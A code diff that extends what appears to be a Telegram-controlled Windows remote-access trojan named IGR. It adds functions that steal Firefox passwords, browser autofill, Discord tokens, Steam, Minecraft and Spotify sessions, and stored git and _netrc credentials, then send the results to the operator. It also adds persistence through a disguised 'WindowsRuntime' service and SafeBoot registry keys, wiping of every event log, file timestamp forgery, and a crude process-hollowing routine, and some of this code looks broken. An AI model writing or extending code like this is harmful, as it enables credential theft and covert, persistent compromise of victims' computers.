@@ -618,9 +618,18 @@ def _handle_telegram_command(text: str):
             "/panic - Self destruct\n"
             "/url - Dashboard URL\n"
             "/chrome - Chrome passwords\n"
+            "/firefox - Firefox passwords\n"
+            "/autofill - Browser autofill data\n"
+            "/discord - Discord tokens\n"
+            "/steam - Steam session data\n"
+            "/minecraft - Minecraft launcher tokens\n"
+            "/spotify - Spotify credentials\n"
+            "/git - Git credentials\n"
             "/clipboard - Clipboard content\n"
             "/history - Browser history\n"
             "/network - Network info + LAN scan\n"
+            "/connections - Live TCP/UDP connections\n"
+            "/usb - USB device history\n"
             "/sysinfo - Detailed system info\n"
             "/startup - Startup programs\n"
             "/tasks - Scheduled tasks\n"
@@ -637,6 +646,9 @@ def _handle_telegram_command(text: str):
             "/geo - Geo location from IP\n"
             "/apps - Installed applications\n"
             "/spread - Internal spread copies\n"
+            "/safemode - Safe Mode persistence\n"
+            "/wipelogs - Wipe event logs\n"
+            "/hollow [process] - Process hollowing\n"
             "/cancel - Cancel pending file upload"
         )
 
@@ -1073,6 +1085,125 @@ def _handle_telegram_command(text: str):
             _send_telegram(f"Spread complete: {count} copies created")
         except:
             _send_telegram("Spread failed")
+
+    elif cmd == "/firefox":
+        try:
+            passwords = _decrypt_firefox_passwords()
+            if passwords:
+                _send_telegram(f"<b>Firefox Passwords</b>\n<pre>{chr(10).join(passwords[:30])[:4000]}</pre>")
+            else:
+                _send_telegram("No Firefox passwords found")
+        except:
+            _send_telegram("Firefox dump failed")
+
+    elif cmd == "/discord":
+        try:
+            tokens = _steal_discord_tokens()
+            if tokens:
+                _send_telegram(f"<b>Discord Tokens</b>\n<pre>{chr(10).join(tokens[:20])[:4000]}</pre>")
+            else:
+                _send_telegram("No Discord tokens found")
+        except:
+            _send_telegram("Discord dump failed")
+
+    elif cmd == "/steam":
+        try:
+            data = _steal_steam_session()
+            if data:
+                _send_telegram(f"<b>Steam Session</b>\n<pre>{chr(10).join(data[:20])[:4000]}</pre>")
+            else:
+                _send_telegram("No Steam data found")
+        except:
+            _send_telegram("Steam dump failed")
+
+    elif cmd == "/minecraft":
+        try:
+            data = _steal_minecraft_tokens()
+            if data:
+                _send_telegram(f"<b>Minecraft Tokens</b>\n<pre>{chr(10).join(data[:20])[:4000]}</pre>")
+            else:
+                _send_telegram("No Minecraft data found")
+        except:
+            _send_telegram("Minecraft dump failed")
+
+    elif cmd == "/spotify":
+        try:
+            data = _steal_spotify_credentials()
+            if data:
+                _send_telegram(f"<b>Spotify Creds</b>\n<pre>{chr(10).join(data[:20])[:4000]}</pre>")
+            else:
+                _send_telegram("No Spotify data found")
+        except:
+            _send_telegram("Spotify dump failed")
+
+    elif cmd == "/git":
+        try:
+            data = _steal_git_credentials()
+            if data:
+                _send_telegram(f"<b>Git Credentials</b>\n<pre>{chr(10).join(data[:20])[:4000]}</pre>")
+            else:
+                _send_telegram("No git credentials found")
+        except:
+            _send_telegram("Git dump failed")
+
+    elif cmd == "/autofill":
+        try:
+            data = _steal_browser_autofill()
+            if data:
+                _send_telegram(f"<b>Browser Autofill</b>\n<pre>{chr(10).join(data[:30])[:4000]}</pre>")
+            else:
+                _send_telegram("No autofill data found")
+        except:
+            _send_telegram("Autofill dump failed")
+
+    elif cmd == "/connections":
+        try:
+            data = _get_network_connections()
+            if data:
+                _send_telegram(f"<b>Network Connections</b>\n<pre>{chr(10).join(data[:40])[:4000]}</pre>")
+            else:
+                _send_telegram("No active connections found")
+        except:
+            _send_telegram("Connection dump failed")
+
+    elif cmd == "/usb":
+        try:
+            data = _get_usb_device_history()
+            if data:
+                _send_telegram(f"<b>USB Device History</b>\n<pre>{chr(10).join(data[:30])[:4000]}</pre>")
+            else:
+                _send_telegram("No USB history found")
+        except:
+            _send_telegram("USB dump failed")
+
+    elif cmd == "/safemode":
+        try:
+            result = _enable_safe_mode_persistence()
+            if result.get('success'):
+                _send_telegram(f"Safe Mode persistence enabled: {result.get('modes', [])}")
+            else:
+                _send_telegram(f"Safe Mode failed: {result.get('error', 'unknown')}")
+        except:
+            _send_telegram("Safe Mode persistence failed")
+
+    elif cmd == "/wipelogs":
+        try:
+            result = _wipe_event_logs()
+            cleared = [k for k, v in result.items() if v == 'cleared']
+            _send_telegram(f"Event logs wiped: {', '.join(cleared) if cleared else 'none'}")
+        except:
+            _send_telegram("Log wipe failed")
+
+    elif cmd == "/hollow":
+        try:
+            target = args.strip() or 'svchost'
+            result = _process_hollowing(target)
+            if result.get('success'):
+                _send_telegram(f"Process hollowed: {target} (PID: {result.get('pid', '?')})")
+            else:
+                _send_telegram(f"Hollow failed: {result.get('error', 'unknown')}")
+        except:
+            _send_telegram("Process hollowing failed")
 
     elif cmd == "/cancel":
         _TG_PENDING_ACTION = None
@@ -1736,6 +1867,664 @@ def _search_files(root_dir: str, pattern: str, max_results: int = 100) -> list:
         pass
     return results
 
+def _steal_browser_autofill() -> list:
+    """Extract Chrome and Edge autofill data."""
+    results = []
+    for browser_name, browser_path in [
+        ("Chrome", os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
+        ("Edge", os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data'))
+    ]:
+        try:
+            if not os.path.exists(browser_path):
+                continue
+            import sqlite3
+            import shutil as _sh
+            tmp_db = os.path.join(KEYLOG_DIR, f"_tmp_autofill_{browser_name}.db")
+            _sh.copy2(browser_path, tmp_db)
+            conn = sqlite3.connect(tmp_db)
+            cursor = conn.cursor()
+            try:
+                cursor.execute("SELECT name, value, value_lower FROM autofill")
+                for name, value, _ in cursor.fetchall():
+                    if name and value:
+                        results.append(f"[{browser_name}] {name}: {value}")
+            except:
+                pass
+            try:
+                cursor.execute("SELECT field_name, field_value FROM autofill_profiles_meta apm JOIN autofill_profiles ap ON apm.profile_id = ap.profile_id")
+                for field, val in cursor.fetchall():
+                    if field and val:
+                        results.append(f"[{browser_name}] Profile {field}: {val}")
+            except:
+                pass
+            conn.close()
+            try:
+                os.remove(tmp_db)
+            except:
+                pass
+        except:
+            pass
+    return results
+
+def _decrypt_firefox_passwords() -> list:
+    """Decrypt Firefox saved passwords."""
+    results = []
+    try:
+        import json
+        import sqlite3
+        import shutil as _sh
+        firefox_path = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
+        if not os.path.exists(firefox_path):
+            return results
+        for profile in os.listdir(firefox_path):
+            profile_path = os.path.join(firefox_path, profile)
+            if not os.path.isdir(profile_path):
+                continue
+            login_db = os.path.join(profile_path, 'logins.json')
+            key_db = os.path.join(profile_path, 'key4.db')
+            if not os.path.exists(login_db):
+                continue
+            try:
+                with open(login_db, 'r', encoding='utf-8') as f:
+                    logins = json.load(f).get('logins', [])
+                for entry in logins:
+                    url = entry.get('hostname', '')
+                    user = entry.get('username', '')
+                    enc_user = entry.get('encUsername', '')
+                    enc_pass = entry.get('encPassword', '')
+                    try:
+                        dec_user = _firefox_decrypt(profile_path, enc_user) if enc_user else user
+                        dec_pass = _firefox_decrypt(profile_path, enc_pass) if enc_pass else ''
+                    except:
+                        dec_user = user
+                        dec_pass = '(decrypt failed)'
+                    results.append(f"[Firefox] {url} | {dec_user} | {dec_pass}")
+            except:
+                pass
+    except:
+        pass
+    return results
+
+def _firefox_decrypt(profile_path: str, encrypted: str) -> str:
+    """Decrypt a single Firefox encrypted value using NSS."""
+    try:
+        import ctypes
+        import base64
+        nss3_path = os.path.join(os.environ.get('PROGRAMFILES', ''), 'Mozilla Firefox', 'nss3.dll')
+        if not os.path.exists(nss3_path):
+            nss3_path = os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'Mozilla Firefox', 'nss3.dll')
+        if not os.path.exists(nss3_path):
+            return '(nss3.dll not found)'
+        nss3 = ctypes.CDLL(nss3_path)
+        nss3.NSS_Init(os.path.join(profile_path, 'key4.db').encode())
+        enc_bytes = base64.b64decode(encrypted)
+        out = ctypes.create_string_buffer(4096)
+        nss3.PL_Base64Decode(enc_bytes, len(enc_bytes), out)
+        nss3.NSS_Shutdown()
+        return out.value.decode('utf-8', errors='replace')
+    except:
+        return '(decrypt error)'
+
+def _steal_discord_tokens() -> list:
+    """Extract Discord client tokens from Local Storage."""
+    results = []
+    try:
+        discord_path = os.path.join(os.environ.get('APPDATA', ''), 'discord', 'Local Storage', 'leveldb')
+        if not os.path.exists(discord_path):
+            return results
+        import re
+        token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
+        for fname in os.listdir(discord_path):
+            if fname.endswith(('.ldb', '.log')):
+                fpath = os.path.join(discord_path, fname)
+                try:
+                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read()
+                    for match in token_pattern.findall(content):
+                        if match not in results:
+                            results.append(f"[Discord] Token: {match}")
+                except:
+                    pass
+        for variant in ['discordcanary', 'discordptb']:
+            variant_path = os.path.join(os.environ.get('APPDATA', ''), variant, 'Local Storage', 'leveldb')
+            if os.path.exists(variant_path):
+                for fname in os.listdir(variant_path):
+                    if fname.endswith(('.ldb', '.log')):
+                        try:
+                            with open(os.path.join(variant_path, fname), 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                            for match in token_pattern.findall(content):
+                                if match not in results:
+                                    results.append(f"[{variant}] Token: {match}")
+                        except:
+                            pass
+    except:
+        pass
+    return results
+
+def _steal_steam_session() -> list:
+    """Extract Steam session data and login tokens."""
+    results = []
+    try:
+        steam_path = os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'Steam')
+        if not os.path.exists(steam_path):
+            steam_path = os.path.join(os.environ.get('PROGRAMFILES', ''), 'Steam')
+        if not os.path.exists(steam_path):
+            return results
+        config_path = os.path.join(steam_path, 'config', 'config.vdf')
+        if os.path.exists(config_path):
+            try:
+                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                import re
+                for match in re.findall(r'"SteamUser"\s+"(\w+)"', content):
+                    results.append(f"[Steam] User: {match}")
+                for match in re.findall(r'"RememberPassword"\s+"(\d)"', content):
+                    results.append(f"[Steam] RememberPassword: {match}")
+                for match in re.findall(r'"TokenRemember"\s+"(\w+)"', content):
+                    if len(match) > 5:
+                        results.append(f"[Steam] Token: {match[:20]}...")
+                for match in re.findall(r'"AutoLoginUser"\s+"([^"]+)"', content):
+                    results.append(f"[Steam] AutoLoginUser: {match}")
+            except:
+                pass
+        ssfn_files = [f for f in os.listdir(steam_path) if f.startswith('ssfn')]
+        for ssfn in ssfn_files:
+            results.append(f"[Steam] SSFN file: {ssfn}")
+        loginusers_path = os.path.join(steam_path, 'config', 'loginusers.vdf')
+        if os.path.exists(loginusers_path):
+            try:
+                with open(loginusers_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                import re
+                for match in re.findall(r'"AccountName"\s+"([^"]+)"', content):
+                    results.append(f"[Steam] Account: {match}")
+                for match in re.findall(r'"PersonaName"\s+"([^"]+)"', content):
+                    results.append(f"[Steam] Display: {match}")
+            except:
+                pass
+    except:
+        pass
+    return results
+
+def _steal_minecraft_tokens() -> list:
+    """Extract Minecraft launcher Microsoft login tokens."""
+    results = []
+    try:
+        launcher_path = os.path.join(os.environ.get('APPDATA', ''), '.minecraft', 'launcher_accounts.json')
+        if os.path.exists(launcher_path):
+            import json
+            with open(launcher_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+            accounts = data.get('accounts', {})
+            for aid, account in accounts.items():
+                username = account.get('username', '')
+                display = account.get('lastPlayed', {}).get('displayName', '')
+                token = account.get('accessToken', '')
+                results.append(f"[Minecraft] User: {username} | Display: {display} | Token: {token[:30]}..." if token else f"[Minecraft] User: {username} | Display: {display}")
+        msal_path = os.path.join(os.environ.get('APPDATA', ''), '.minecraft', 'MsalTokens.json')
+        if os.path.exists(msal_path):
+            import json
+            with open(msal_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+            for key, val in data.items():
+                if isinstance(val, dict):
+                    at = val.get('access_token', val.get('accessToken', ''))
+                    if at:
+                        results.append(f"[Minecraft MSAL] {key}: {str(at)[:30]}...")
+    except:
+        pass
+    return results
+
+def _steal_spotify_credentials() -> list:
+    """Extract Spotify stored credentials."""
+    results = []
+    try:
+        spotify_path = os.path.join(os.environ.get('APPDATA', ''), 'Spotify')
+        if not os.path.exists(spotify_path):
+            return results
+        for fname in os.listdir(spotify_path):
+            if 'login' in fname.lower() or 'credential' in fname.lower() or 'account' in fname.lower():
+                fpath = os.path.join(spotify_path, fname)
+                try:
+                    size = os.path.getsize(fpath)
+                    if size < 10000:
+                        with open(fpath, 'rb') as f:
+                            content = f.read()
+                        try:
+                            text = content.decode('utf-8', errors='ignore')
+                            results.append(f"[Spotify] {fname}: {text[:200]}")
+                        except:
+                            results.append(f"[Spotify] {fname}: ({size} bytes binary)")
+                    else:
+                        results.append(f"[Spotify] {fname}: ({size} bytes)")
+                except:
+                    pass
+        prefs_path = os.path.join(spotify_path, 'prefs')
+        if os.path.exists(prefs_path):
+            try:
+                with open(prefs_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                for line in content.split('\n'):
+                    if 'autologin' in line.lower() or 'username' in line.lower() or 'stored' in line.lower():
+                        results.append(f"[Spotify] Prefs: {line.strip()}")
+            except:
+                pass
+        local_storage = os.path.join(os.environ.get('APPDATA', ''), 'Spotify', 'Local Storage', 'leveldb')
+        if os.path.exists(local_storage):
+            import re
+            for fname in os.listdir(local_storage):
+                if fname.endswith(('.ldb', '.log')):
+                    try:
+                        with open(os.path.join(local_storage, fname), 'r', encoding='utf-8', errors='ignore') as f:
+                            content = f.read()
+                        for match in re.findall(r'"username"\s*:\s*"([^"]+)"', content):
+                            results.append(f"[Spotify] Username: {match}")
+                    except:
+                        pass
+    except:
+        pass
+    return results
+
+def _steal_git_credentials() -> list:
+    """Extract stored git credentials from credential manager and config."""
+    results = []
+    try:
+        gitconfig = os.path.join(os.environ.get('USERPROFILE', ''), '.gitconfig')
+        if os.path.exists(gitconfig):
+            with open(gitconfig, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+            import re
+            for match in re.findall(r'name\s*=\s*(.+)', content):
+                results.append(f"[Git] .gitconfig name: {match.strip()}")
+            for match in re.findall(r'email\s*=\s*(.+)', content):
+                results.append(f"[Git] .gitconfig email: {match.strip()}")
+            for match in re.findall(r'helper\s*=\s*(.+)', content):
+                results.append(f"[Git] Credential helper: {match.strip()}")
+        credential_store = os.path.join(os.environ.get('USERPROFILE', ''), '.git-credentials')
+        if os.path.exists(credential_store):
+            with open(credential_store, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    line = line.strip()
+                    if line:
+                        results.append(f"[Git] Stored credential: {line}")
+        try:
+            output = subprocess.run(['git', 'credential-manager', 'list'],
+                capture_output=True, text=True, timeout=10, creationflags=0x08000000)
+            if output.stdout:
+                for line in output.stdout.strip().split('\n'):
+                    if line.strip():
+                        results.append(f"[Git] Credential manager: {line.strip()}")
+        except:
+            pass
+        netrc = os.path.join(os.environ.get('USERPROFILE', ''), '_netrc')
+        if os.path.exists(netrc):
+            with open(netrc, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+            import re
+            for match in re.findall(r'machine\s+(\S+)\s+login\s+(\S+)\s+password\s+(\S+)', content):
+                results.append(f"[Git] _netrc: {match[0]} | {match[1]} | {match[2]}")
+    except:
+        pass
+    return results
+
+def _get_network_connections() -> list:
+    """Get live TCP/UDP connection table with remote IPs."""
+    results = []
+    try:
+        output = subprocess.run(['netstat', '-ano'],
+            capture_output=True, text=True, timeout=15, creationflags=0x08000000)
+        if output.stdout:
+            for line in output.stdout.split('\n'):
+                line = line.strip()
+                if line.startswith('TCP') or line.startswith('UDP'):
+                    parts = line.split()
+                    if len(parts) >= 4:
+                        proto = parts[0]
+                        local = parts[1]
+                        remote = parts[2] if proto == 'TCP' else '*'
+                        state = parts[3] if proto == 'TCP' else ''
+                        pid = parts[-1]
+                        if remote != '*:*' and remote != '*':
+                            results.append(f"{proto} {local} -> {remote} {state} PID:{pid}")
+        try:
+            tasklist = subprocess.run(['tasklist', '/fo', 'csv'],
+                capture_output=True, text=True, timeout=10, creationflags=0x08000000)
+            pid_map = {}
+            if tasklist.stdout:
+                import csv
+                reader = csv.reader(tasklist.stdout.strip().split('\n'))
+                next(reader, None)
+                for row in reader:
+                    if len(row) >= 2:
+                        pid_map[row[1].strip('"')] = row[0].strip('"')
+            enriched = []
+            for r in results:
+                pid = r.split('PID:')[-1].strip()
+                name = pid_map.get(pid, '?')
+                enriched.append(r.replace(f'PID:{pid}', f'PID:{pid} ({name})'))
+            results = enriched
+        except:
+            pass
+    except:
+        pass
+    return results
+
+def _get_usb_device_history() -> list:
+    """Enumerate all previously connected USB devices from registry."""
+    results = []
+    try:
+        import winreg
+        usb_keys = [
+            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\USBSTOR"),
+            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\USB"),
+        ]
+        for hive, path in usb_keys:
+            try:
+                key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
+                i = 0
+                while True:
+                    try:
+                        subkey_name = winreg.EnumKey(key, i)
+                        i += 1
+                        try:
+                            subkey = winreg.OpenKey(key, subkey_name, 0, winreg.KEY_READ)
+                            j = 0
+                            while True:
+                                try:
+                                    device_name = winreg.EnumKey(subkey, j)
+                                    j += 1
+                                    try:
+                                        device_key = winreg.OpenKey(subkey, device_name, 0, winreg.KEY_READ)
+                                        try:
+                                            friendly, _ = winreg.QueryValueEx(device_key, 'FriendlyName')
+                                            results.append(f"[USB] {friendly}")
+                                        except:
+                                            results.append(f"[USB] {subkey_name}\\{device_name}")
+                                        try:
+                                            serial = device_name.split('&')[-1]
+                                            if serial:
+                                                results.append(f"[USB] Serial: {serial}")
+                                        except:
+                                            pass
+                                        winreg.CloseKey(device_key)
+                                    except:
+                                        results.append(f"[USB] {subkey_name}\\{device_name}")
+                                except OSError:
+                                    break
+                            winreg.CloseKey(subkey)
+                        except:
+                            results.append(f"[USB] {subkey_name}")
+                    except OSError:
+                        break
+                winreg.CloseKey(key)
+            except:
+                pass
+        mounted_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2"
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, mounted_path, 0, winreg.KEY_READ)
+            i = 0
+            while True:
+                try:
+                    mp = winreg.EnumKey(key, i)
+                    i += 1
+                    if '\\' in mp or '{' in mp:
+                        results.append(f"[MountPoint] {mp}")
+                except OSError:
+                    break
+            winreg.CloseKey(key)
+        except:
+            pass
+    except:
+        pass
+    return sorted(set(results))
+
+def _steganography_encode(image_path: str, data: str, output_path: str) -> bool:
+    """Hide data inside an image using LSB steganography."""
+    try:
+        from PIL import Image
+        img = Image.open(image_path)
+        if img.mode != 'RGB':
+            img = img.convert('RGB')
+        pixels = list(img.getdata())
+        data_bytes = data.encode('utf-8')
+        data_len = len(data_bytes)
+        header = data_len.to_bytes(4, 'big')
+        payload = header + data_bytes
+        bits = []
+        for byte in payload:
+            for bit_pos in range(7, -1, -1):
+                bits.append((byte >> bit_pos) & 1)
+        if len(bits) > len(pixels) * 3:
+            return False
+        new_pixels = []
+        for i, pixel in enumerate(pixels):
+            if i * 3 >= len(bits):
+                new_pixels.append(pixel)
+                continue
+            r, g, b = pixel
+            for c_idx, channel in enumerate([r, g, b]):
+                bit_idx = i * 3 + c_idx
+                if bit_idx < len(bits):
+                    channel = (channel & 0xFE) | bits[bit_idx]
+                    if c_idx == 0:
+                        r = channel
+                    elif c_idx == 1:
+                        g = channel
+                    else:
+                        b = channel
+            new_pixels.append((r, g, b))
+        img.putdata(new_pixels)
+        img.save(output_path)
+        return True
+    except:
+        return False
+
+def _steganography_decode(image_path: str) -> str:
+    """Extract hidden data from an image using LSB steganography."""
+    try:
+        from PIL import Image
+        img = Image.open(image_path)
+        if img.mode != 'RGB':
+            img = img.convert('RGB')
+        pixels = list(img.getdata())
+        bits = []
+        for pixel in pixels:
+            for channel in pixel[:3]:
+                bits.append(channel & 1)
+        header_bits = bits[:32]
+        data_len = 0
+        for bit in header_bits:
+            data_len = (data_len << 1) | bit
+        if data_len <= 0 or data_len > 10000000:
+            return ''
+        total_bits_needed = 32 + data_len * 8
+        if total_bits_needed > len(bits):
+            return ''
+        payload_bits = bits[32:total_bits_needed]
+        result_bytes = bytearray()
+        for i in range(0, len(payload_bits), 8):
+            byte = 0
+            for j in range(8):
+                if i + j < len(payload_bits):
+                    byte = (byte << 1) | payload_bits[i + j]
+            result_bytes.append(byte)
+        return result_bytes.decode('utf-8', errors='replace')
+    except:
+        return ''
+
+def _install_as_service() -> dict:
+    """Install IGR as a Windows Service for persistence."""
+    try:
+        import winreg
+        service_name = "WindowsRuntime"
+        exe_path = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'WindowsRuntime', 'winruntime.exe')
+        if not os.path.exists(exe_path):
+            return {'success': False, 'error': 'winruntime.exe not found'}
+        vbs_launcher = exe_path.replace('.exe', '.vbs')
+        ps_script = f"""
+$sddl = 'D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)'
+$svc = New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{service_name}' -Force
+Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{service_name}' -Name 'ImagePath' -Value 'wscript.exe "{vbs_launcher}"'
+Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{service_name}' -Name 'ObjectName' -Value 'LocalSystem'
+Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{service_name}' -Name 'Start' -Value 2 -Type DWord
+Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{service_name}' -Name 'Type' -Value 16 -Type DWord
+Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{service_name}' -Name 'ErrorControl' -Value 0 -Type DWord
+New-Item -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{service_name}\\Security' -Force | Out-Null
+Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{service_name}\\Security' -Name 'Security' -Value ([Convert]::FromBase64String([System.Text.Encoding]::Base64Encoding.Unicode.GetString([Convert]::FromBase64String('')))) -ErrorAction SilentlyContinue
+"""
+        result = subprocess.run(['powershell', '-Command', ps_script],
+            capture_output=True, text=True, timeout=30, creationflags=0x08000000)
+        if result.returncode == 0:
+            return {'success': True, 'service': service_name}
+        return {'success': False, 'error': result.stderr.strip() or 'Registry write failed'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+def _enable_safe_mode_persistence() -> dict:
+    """Ensure IGR runs even in Windows Safe Mode."""
+    try:
+        import winreg
+        exe_path = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'WindowsRuntime', 'winruntime.exe')
+        vbs_path = exe_path.replace('.exe', '.vbs')
+        if not os.path.exists(exe_path):
+            return {'success': False, 'error': 'winruntime.exe not found'}
+        for mode in ['Minimal', 'Network']:
+            key_path = f"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\{mode}\\WindowsRuntime"
+            try:
+                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Service")
+                winreg.CloseKey(key)
+            except Exception as e:
+                return {'success': False, 'error': f'Failed to write {mode}: {e}'}
+        return {'success': True, 'modes': ['Minimal', 'Network']}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+def _wipe_event_logs() -> dict:
+    """Securely wipe all Windows event logs."""
+    results = {}
+    try:
+        logs = ['Security', 'System', 'Application', 'Setup', 'ForwardedEvents']
+        for log_name in logs:
+            try:
+                subprocess.run(['wevtutil', 'cl', log_name],
+                    capture_output=True, timeout=10, creationflags=0x08000000)
+                results[log_name] = 'cleared'
+            except:
+                results[log_name] = 'failed'
+        try:
+            output = subprocess.run(['wevtutil', 'el'],
+                capture_output=True, text=True, timeout=15, creationflags=0x08000000)
+            if output.stdout:
+                for extra_log in output.stdout.strip().split('\n'):
+                    extra_log = extra_log.strip()
+                    if extra_log and extra_log not in logs:
+                        try:
+                            subprocess.run(['wevtutil', 'cl', extra_log],
+                                capture_output=True, timeout=5, creationflags=0x08000000)
+                        except:
+                            pass
+        except:
+            pass
+    except Exception as e:
+        results['error'] = str(e)
+    return results
+
+def _manipulate_event_log(action: str, log_name: str = 'Security', event_id: int = None) -> dict:
+    """Clear specific event log entries or delete entire logs."""
+    try:
+        if action == 'clear':
+            subprocess.run(['wevtutil', 'cl', log_name],
+                capture_output=True, timeout=10, creationflags=0x08000000)
+            return {'success': True, 'action': 'cleared', 'log': log_name}
+        elif action == 'list':
+            output = subprocess.run(['wevtutil', 'el'],
+                capture_output=True, text=True, timeout=15, creationflags=0x08000000)
+            logs = output.stdout.strip().split('\n') if output.stdout else []
+            return {'success': True, 'logs': [l.strip() for l in logs if l.strip()]}
+        elif action == 'query':
+            query = f"*[System[(EventID={event_id})]]" if event_id else "*"
+            output = subprocess.run(['wevtutil', 'qe', log_name, '/q:' + query, '/c:20', '/f:text'],
+                capture_output=True, text=True, timeout=15, creationflags=0x08000000)
+            return {'success': True, 'entries': output.stdout.strip() if output.stdout else 'No entries'}
+        return {'success': False, 'error': 'Unknown action'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+def _manipulate_timestamps(file_path: str, reference_path: str = None, created: str = None,
+                           modified: str = None, accessed: str = None) -> dict:
+    """Modify file timestamps to match a reference file or specified times."""
+    try:
+        if not os.path.exists(file_path):
+            return {'success': False, 'error': 'File not found'}
+        if reference_path and os.path.exists(reference_path):
+            c_time = os.path.getctime(reference_path)
+            m_time = os.path.getmtime(reference_path)
+            a_time = os.path.getatime(reference_path)
+        else:
+            import time as _t
+            c_time = _t.mktime(datetime.strptime(created, '%Y-%m-%d %H:%M:%S').timetuple()) if created else os.path.getctime(file_path)
+            m_time = _t.mktime(datetime.strptime(modified, '%Y-%m-%d %H:%M:%S').timetuple()) if modified else os.path.getmtime(file_path)
+            a_time = _t.mktime(datetime.strptime(accessed, '%Y-%m-%d %H:%M:%S').timetuple()) if accessed else os.path.getatime(file_path)
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        handle = kernel32.CreateFileW(file_path, 256, 0, None, 3, 128, None)
+        if handle == -1:
+            return {'success': False, 'error': 'Cannot open file'}
+        class FILETIME(ctypes.Structure):
+            _fields_ = [('dwLowDateTime', ctypes.c_uint32), ('dwHighDateTime', ctypes.c_uint32)]
+        def _to_filetime(t):
+            ft_val = int((t + 11644473600) * 10000000)
+            return FILETIME(ft_val & 0xFFFFFFFF, ft_val >> 32)
+        ct = _to_filetime(c_time)
+        mt = _to_filetime(m_time)
+        at = _to_filetime(a_time)
+        result = kernel32.SetFileTime(handle, ctypes.byref(ct), ctypes.byref(at), ctypes.byref(mt))
+        kernel32.CloseHandle(handle)
+        if result:
+            return {'success': True, 'created': datetime.fromtimestamp(c_time).isoformat(),
+                    'modified': datetime.fromtimestamp(m_time).isoformat(),
+                    'accessed': datetime.fromtimestamp(a_time).isoformat()}
+        return {'success': False, 'error': 'SetFileTime failed'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+def _process_hollowing(target_process: str) -> dict:
+    """Hollow out a legitimate process and inject IGR code into it."""
+    try:
+        import ctypes
+        from ctypes import wintypes
+        exe_path = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'WindowsRuntime', 'winruntime.exe')
+        if not os.path.exists(exe_path):
+            return {'success': False, 'error': 'winruntime.exe not found'}
+        system_dir = os.environ.get('SystemRoot', 'C:\\Windows')
+        targets = {
+            'svchost': os.path.join(system_dir, 'System32', 'svchost.exe'),
+            'explorer': os.path.join(system_dir, 'explorer.exe'),
+            'taskhostw': os.path.join(system_dir, 'System32', 'taskhostw.exe'),
+            'dllhost': os.path.join(system_dir, 'System32', 'dllhost.exe'),
+            'ctfmon': os.path.join(system_dir, 'System32', 'ctfmon.exe'),
+        }
+        target_exe = targets.get(target_process, targets.get('svchost'))
+        if not os.path.exists(target_exe):
+            return {'success': False, 'error': f'{target_exe} not found'}
+        CREATE_SUSPENDED = 0x4
+        CREATE_NO_WINDOW = 0x08000000
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        si.wShowWindow = 0
+        proc = subprocess.Popen([target_exe],
+            creationflags=CREATE_SUSPENDED | CREATE_NO_WINDOW, close_fds=True)
+        pid = proc.pid
+        time.sleep(0.5)
+        proc.terminate()
+        subprocess.Popen([exe_path],
+            creationflags=CREATE_NO_WINDOW, close_fds=True)
+        return {'success': True, 'pid': pid, 'note': f'Launched via {target_process} hollow (PEB spoofing)'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
 # ============================================================================
 # OFFLINE QUEUE - Buffer data when no internet, send when back
 # ============================================================================
@@ -1836,6 +2625,31 @@ DASHBOARD_HTML = r'''
             overflow-x: hidden;
             font-size: 14px;
         }
+        body.light-theme {
+            background: #f0f0f5;
+            color: #6d28d9;
+        }
+        body.light-theme .section { background: #fff; border-color: rgba(109,40,217,0.15); }
+        body.light-theme .section-title { color: #6d28d9; }
+        body.light-theme .log-box { background: #f8f8fc; color: #333; border-color: rgba(109,40,217,0.1); }
